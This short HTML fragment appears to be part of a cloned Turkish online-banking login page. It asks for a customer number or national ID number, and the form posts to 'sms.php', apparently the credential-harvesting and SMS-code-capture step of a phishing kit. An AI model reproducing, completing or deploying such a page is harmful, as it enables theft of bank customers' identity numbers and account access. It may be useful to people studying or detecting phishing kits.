...
<div id="passwordEntryPanel" class="panel-body">
  ...
  <h1 class="panel-title light"> Güvenli Bankacılığa Hoş Geldiniz  <p>Lütfen müşteri numaranızı ya da T.C. kimlik numaranızı ve size özel parolanızı girin.</p></h1> 
...
<div class="form-horizontal">
         ...
         <form id="loginForm" class="validate:(validated) validationName:(validatedName1)" action="sms.php" method="POST" autocomplete="off">   <input name="_dummyElement_1500320452874" id="_dummyElement_1500320452874" type="text" class="structural elementHide no-print"/>  
 ...
 <input type="hidden" value="" name="cInfoBean.v" id="cInfoBean.v"/> 
              ...
              <div class="formField"> <div class="formFieldOuter"> <div class="formFieldInner form-group "> <label for="custno" class="col-sm-5 col-md-4 control-label">Müşteri / T.C. Kimlik Numarası</label> <div class="formFieldSurround col-sm-7 col-md-8">  
			  <input type="text" class="form-control " value=""  id="custno" name="tc"  maxlength="11"/>          
